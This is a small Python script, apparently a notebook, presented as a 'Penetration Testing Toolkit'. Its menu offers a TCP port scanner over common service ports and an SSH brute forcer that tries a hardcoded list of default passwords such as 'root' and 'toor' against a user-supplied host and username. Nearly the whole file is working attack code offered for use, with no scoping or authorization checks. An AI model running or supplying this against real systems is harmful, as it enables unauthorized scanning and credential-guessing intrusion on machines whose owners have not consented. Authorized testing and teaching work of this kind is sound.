
#  Penetration Testing Toolkit
 

#  Install dependencies
!pip install paramiko

#  Import libraries
import socket
import paramiko

# Port Scanner Function
def scan_ports(target, ports=[21, 22, 23, 80, 443, 3306, 8080]):
    print(f"\n[+] Scanning Target: {target}")
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            if result == 0:
                print(f"[OPEN] Port {port} is open.")
            sock.close()
        except Exception as e:
            print(f"[ERROR] Could not scan port {port}: {e}")

#  SSH Brute Forcer Function
def run_brute_force():
    target = input("Enter SSH target IP: ")
    username = input("Enter SSH username: ")
    passwords = ["admin", "1234", "password", "root", "toor"]

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in passwords:
        try:
            print(f"[~] Trying password: {password}")
            ssh.connect(target, username=username, password=password, timeout=3)
            print(f"[✔] Success! Password found: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print("[-] Incorrect password")
        except Exception as e:
            print(f"[!] Connection error: {e}")
    print("[-] Brute force failed. No valid password found.")

#  Menu Function
def main():
    print("\n=== PENETRATION TESTING TOOLKIT ===")
    print("1. Port Scanner")
    print("2. SSH Brute Forcer")
    choice = input("Enter your choice (1 or 2): ")

    if choice == '1':
        target = input("Enter target IP/hostname: ")
        scan_ports(target)
    elif choice == '2':
        run_brute_force()
    else:
        print("Invalid option selected.")

#  Run the toolkit
main()
